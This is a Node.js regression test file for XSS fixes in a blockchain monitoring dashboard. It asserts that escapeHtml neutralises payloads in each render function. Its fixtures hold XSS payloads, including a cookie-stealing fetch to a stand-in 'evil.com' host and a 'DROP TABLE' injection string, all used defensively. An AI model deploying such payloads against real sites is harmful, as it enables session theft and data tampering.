/**
 * Monitoring Tests — Phase 17 audit fixes
 * Run: node monitoring.test.js
 *
 * Tests all findings fixed during Phase 17 Monitoring audit:
 *  F17.1  — XSS in renderEvents (e.text unescaped)
 *  F17.2  — XSS in renderThreats (t.source onclick injection + all fields unescaped)
 *  F17.3  — XSS in renderBans (b.target/b.reason from prompt() unescaped)
 *  F17.4  — XSS in renderBlocks (b.hash from RPC unescaped)
 *  F17.5  — XSS in updateContracts (c.symbol/c.template/c.program unescaped)
 *  F17.6  — XSS in validator/DEX/contract monitor grids (RPC pubkeys/programs unescaped)
 *  F17.7  — setTPSRange implicit global event variable (fragile, breaks in strict mode)
 */
'use strict';

let passed = 0, failed = 0;
function assert(cond, msg) {
    if (cond) { passed++; process.stdout.write(`  ✓ ${msg}\n`); }
    else { failed++; process.stderr.write(`  ✗ ${msg}\n`); }
}
function assertEqual(a, b, msg) {
    const eq = typeof a === 'object' ? JSON.stringify(a) === JSON.stringify(b) : a === b;
    if (eq) { passed++; process.stdout.write(`  ✓ ${msg}\n`); }
    else { failed++; process.stderr.write(`  ✗ ${msg}: expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}\n`); }
}

// ═══════════════════════════════════════════════════════════════════════════
// Reproduce pure functions from monitoring.js for unit-level testing
// ═══════════════════════════════════════════════════════════════════════════

function escapeHtml(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function truncAddr(addr) {
    if (!addr || addr.length < 12) return addr || '--';
    return addr.slice(0, 6) + '...' + addr.slice(-4);
}

function formatNum(n) {
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n.toLocaleString();
}

const SPORES_PER_LICN = 1000000000;
function formatLicn(spores) {
    const licn = spores / SPORES_PER_LICN;
    if (licn >= 1e9) return (licn / 1e9).toFixed(2) + 'B';
    if (licn >= 1e6) return (licn / 1e6).toFixed(2) + 'M';
    if (licn >= 1e3) return (licn / 1e3).toFixed(1) + 'K';
    return licn.toFixed(2);
}

// ═══════════════════════════════════════════════════════════════════════════
// F17.1 — renderEvents escapes e.text
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.1: renderEvents XSS prevention ──');

// Simulate event rendering with escapeHtml (as fixed code does)
const xssEvent = { type: 'danger', icon: 'ban', text: '<script>alert("xss")</script>', time: '12:00:00' };
const renderedEvent = `
    <div class="event-item ${escapeHtml(xssEvent.type)}">
        <span class="event-time">${escapeHtml(xssEvent.time)}</span>
        <span class="event-icon"><i class="fas fa-${escapeHtml(xssEvent.icon)}"></i></span>
        <span class="event-text">${escapeHtml(xssEvent.text)}</span>
    </div>`;
assert(!renderedEvent.includes('<script>'), 'renderEvents: script tag in e.text escaped');
assert(renderedEvent.includes('&lt;script&gt;'), 'renderEvents: script tag became entity');

const xssIcon = { type: 'info', icon: 'ban"><script>alert(1)</script><i class="', text: 'test', time: '00:00' };
const renderedIcon = `<i class="fas fa-${escapeHtml(xssIcon.icon)}"></i>`;
assert(!renderedIcon.includes('<script>'), 'renderEvents: icon injection escaped');

// ═══════════════════════════════════════════════════════════════════════════
// F17.2 — renderThreats: no onclick injection, all fields escaped
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.2: renderThreats XSS prevention ──');

// The critical attack: t.source = "'); alert('XSS'); //'"  
// Old code: onclick="quickBan('${t.source}')" → onclick="quickBan(''); alert('XSS'); //')"
const maliciousSource = "'); alert('XSS'); //'";
const escapedSource = escapeHtml(maliciousSource);
assert(!escapedSource.includes("'"), 'threat source: single quotes escaped');
assert(escapedSource.includes('&#39;'), 'threat source: quotes became entities');

// Verify data-attribute approach is safe (HTML-escaped value in attribute)
const dataAttr = `data-ban-source="${escapedSource}"`;
assert(!dataAttr.includes("onclick"), 'threat btn: no onclick attribute');
assert(dataAttr.includes('data-ban-source='), 'threat btn: uses data-attribute');

// Test all threat fields
const maliciousThreat = {
    time: '13:37',
    severity: 'critical"><script>alert(1)</script>',
    type: '<img src=x onerror=alert(1)>',
    source: "192.168.1.1'; DROP TABLE threats; --",
    method: '<b onmouseover=alert(1)>hover</b>',
    details: '"><script>document.cookie</script>',
};

const escaped = {
    time: escapeHtml(maliciousThreat.time),
    severity: escapeHtml(maliciousThreat.severity),
    type: escapeHtml(maliciousThreat.type),
    source: escapeHtml(maliciousThreat.source),
    method: escapeHtml(maliciousThreat.method),
    details: escapeHtml(maliciousThreat.details),
};

assert(!escaped.severity.includes('<script>'), 'threat severity: XSS payload escaped');
assert(!escaped.type.includes('<img'), 'threat type: img XSS payload escaped');
assert(!escaped.source.includes("'"), 'threat source: SQL-style injection quotes escaped');
assert(!escaped.method.includes('<b'), 'threat method: event handler payload escaped');
assert(!escaped.details.includes('<script>'), 'threat details: script tag escaped');

// ═══════════════════════════════════════════════════════════════════════════
// F17.3 — renderBans: target/reason from prompt() escaped
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.3: renderBans XSS prevention ──');

const maliciousBan = {
    type: 'ip-ban',
    target: '<img src=x onerror=alert(document.cookie)>',
    reason: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
    time: '12:00:00'
};

const banHtml = `
    <span class="ban-type ${escapeHtml(maliciousBan.type)}">${escapeHtml(maliciousBan.type.toUpperCase())}</span>
    <span class="ban-target">${escapeHtml(maliciousBan.target)}</span>
    <span class="ban-reason">${escapeHtml(maliciousBan.reason)}</span>
    <button class="btn-xs" data-remove-ban="0" title="Remove">`;

assert(!banHtml.includes('<img'), 'ban target: img XSS payload escaped');
assert(!banHtml.includes('<script>'), 'ban reason: script tag escaped');
assert(!banHtml.includes('onclick='), 'ban button: no inline onclick');
assert(banHtml.includes('data-remove-ban='), 'ban button: uses data-attribute');

// ═══════════════════════════════════════════════════════════════════════════
// F17.4 — renderBlocks: b.hash from RPC escaped
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.4: renderBlocks XSS prevention ──');

const maliciousBlock = {
    slot: 42,
    hash: '<script>alert("block-xss")</script>',
    txCount: 5,
    time: Math.floor(Date.now() / 1000)
};

const blockHtml = `<span class="block-hash">${escapeHtml(maliciousBlock.hash)}</span>`;
assert(!blockHtml.includes('<script>'), 'block hash: script tag escaped');
assert(blockHtml.includes('&lt;script&gt;'), 'block hash: became entity');

// ═══════════════════════════════════════════════════════════════════════════
// F17.5 — updateContracts: symbol/template/program escaped
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.5: updateContracts XSS prevention ──');

const maliciousContract = {
    symbol: '<script>alert("sym")</script>',
    template: '"><img src=x onerror=alert(1)>',
    program: 'AAAA<script>BBBB</script>CCCC',
};

const contractHtml = `
    <span class="contract-symbol">${escapeHtml(maliciousContract.symbol)}</span>
    <span class="contract-template">${escapeHtml(maliciousContract.template)}</span>
    <span class="contract-addr">${escapeHtml(maliciousContract.program)}</span>`;

assert(!contractHtml.includes('<script>'), 'contract symbol: script escaped');
assert(!contractHtml.includes('<img'), 'contract template: img escaped');
assert(contractHtml.includes('&lt;script&gt;'), 'contract program: script became entity');

// ═══════════════════════════════════════════════════════════════════════════
// F17.6 — Validator/DEX/Contract monitor grids: RPC data escaped
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.6: Grid rendering XSS prevention ──');

// Validator grid
const maliciousPubkey = '<img/src=x onerror=alert(1)>ABCDEFGHIJKLMNOP';
const truncated = truncAddr(maliciousPubkey);
const escapedTrunc = escapeHtml(truncated);
assert(!escapedTrunc.includes('<img'), 'validator pubkey: img tag escaped after truncation');

// DEX card program address
const maliciousProgram = '"><script>alert("dex")</script>';
const dexCardAddr = `<div>${escapeHtml(truncAddr(maliciousProgram))}</div>`;
assert(!dexCardAddr.includes('<script>'), 'DEX card program: script escaped');

// Contract monitor card
const cmProgram = '<script>alert(1)</script>11111111111111';
const cmHtml = `<div class="cm-addr" title="${escapeHtml(cmProgram)}">${escapeHtml(cmProgram)}</div>`;
assert(!cmHtml.includes('<script>'), 'contract monitor addr: script escaped');
assert(cmHtml.includes('&lt;script&gt;'), 'contract monitor addr: entity in content');
assert(cmHtml.includes('title="&lt;script'), 'contract monitor addr: entity in title attr');

// ═══════════════════════════════════════════════════════════════════════════
// F17.7 — setTPSRange accepts event parameter
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── F17.7: setTPSRange event parameter ──');

const fs = require('fs');
const path = require('path');

const monSrc = fs.readFileSync(path.join(__dirname, 'js', 'monitoring.js'), 'utf-8');
const utilsSrc = fs.readFileSync(path.join(__dirname, 'shared', 'utils.js'), 'utf-8');

assert(monSrc.includes('function setTPSRange(range, evt)'),
    'setTPSRange: accepts explicit evt parameter');
assert(monSrc.includes('evt.target'), 'setTPSRange: uses evt.target not global event');
assert(!monSrc.match(/function setTPSRange\(range\)\s*\{/),
    'setTPSRange: no longer has single-param signature');

// Verify HTML passes event
const htmlSrc = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf-8');
assert(htmlSrc.includes("setTPSRange('1m', event)"),
    'index.html: setTPSRange 1m passes event');
assert(htmlSrc.includes("setTPSRange('5m', event)"),
    'index.html: setTPSRange 5m passes event');
assert(htmlSrc.includes("setTPSRange('15m', event)"),
    'index.html: setTPSRange 15m passes event');

// ═══════════════════════════════════════════════════════════════════════════
// Source integrity: verify escapeHtml is used in all critical render functions
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── Source integrity ──');

assert(utilsSrc.includes('function escapeHtml(str)'),
    'shared/utils.js: escapeHtml helper exists');

// renderEvents
const renderEventsBody = monSrc.split('function renderEvents')[1]?.split('function ')[0] || '';
assert(renderEventsBody.includes('escapeHtml(e.text)'),
    'renderEvents: e.text passed through escapeHtml');
assert(renderEventsBody.includes('escapeHtml(e.type)'),
    'renderEvents: e.type passed through escapeHtml');
assert(renderEventsBody.includes('escapeHtml(e.icon)'),
    'renderEvents: e.icon passed through escapeHtml');

// renderThreats — no onclick with interpolated source
const renderThreatsBody = monSrc.split('function renderThreats')[1]?.split('\nfunction ')[0] || '';
assert(!renderThreatsBody.includes("onclick=\"quickBan('${"),
    'renderThreats: no onclick with interpolated source (was injection vector)');
assert(renderThreatsBody.includes('data-ban-source'),
    'renderThreats: uses data-ban-source attribute');
assert(renderThreatsBody.includes('data-throttle-source'),
    'renderThreats: uses data-throttle-source attribute');
assert(renderThreatsBody.includes('addEventListener'),
    'renderThreats: uses addEventListener for click handlers');
assert(renderThreatsBody.includes('escapeHtml(t.source)'),
    'renderThreats: t.source escaped');
assert(renderThreatsBody.includes('escapeHtml(t.details)'),
    'renderThreats: t.details escaped');
assert(renderThreatsBody.includes('escapeHtml(t.type)'),
    'renderThreats: t.type escaped');
assert(renderThreatsBody.includes('escapeHtml(t.method)'),
    'renderThreats: t.method escaped');

// renderBans
const renderBansBody = monSrc.split('function renderBans')[1]?.split('\nfunction ')[0] || '';
assert(!renderBansBody.includes("onclick=\"removeBan("),
    'renderBans: no inline onclick');
assert(renderBansBody.includes('data-remove-ban'),
    'renderBans: uses data-remove-ban attribute');
assert(renderBansBody.includes('escapeHtml(b.target)'),
    'renderBans: b.target escaped');
assert(renderBansBody.includes('escapeHtml(b.reason)'),
    'renderBans: b.reason escaped');

// renderBlocks
const renderBlocksBody = monSrc.split('function renderBlocks')[1]?.split('function ')[0] || '';
assert(renderBlocksBody.includes('escapeHtml(b.hash)'),
    'renderBlocks: b.hash escaped');

// Validator grid
assert(monSrc.includes('escapeHtml(truncAddr(p.pubkey))'),
    'validator grid: pubkey escaped');
assert(monSrc.includes('escapeHtml(p.name)'),
    'validator grid: name escaped');

// Contract registry
assert(monSrc.includes('escapeHtml(c.symbol)'),
    'contract registry: symbol escaped');
assert(monSrc.includes('escapeHtml(c.template)'),
    'contract registry: template escaped');
assert(monSrc.includes('escapeHtml(c.program)'),
    'contract registry: program escaped');

// DEX monitor
assert(monSrc.includes('escapeHtml(program)'),
    'DEX monitor: program address escaped');

// Contract monitor
assert(monSrc.includes('title="${escapeHtml(program)}"'),
    'contract monitor: program in title escaped');

// ═══════════════════════════════════════════════════════════════════════════
// escapeHtml edge cases
// ═══════════════════════════════════════════════════════════════════════════

console.log('\n── escapeHtml edge cases ──');

assertEqual(escapeHtml(0), '0', 'escapeHtml: zero');
assertEqual(escapeHtml(false), 'false', 'escapeHtml: false');
assertEqual(escapeHtml('normal text'), 'normal text', 'escapeHtml: clean string unchanged');
assertEqual(escapeHtml('a&b<c>d"e\'f'), 'a&amp;b&lt;c&gt;d&quot;e&#39;f', 'escapeHtml: all 5 chars');

// ═══════════════════════════════════════════════════════════════════════════
// Summary
// ═══════════════════════════════════════════════════════════════════════════

console.log(`\n═══ Phase 17 Monitoring: ${passed} passed, ${failed} failed ═══`);
process.exit(failed > 0 ? 1 : 0);
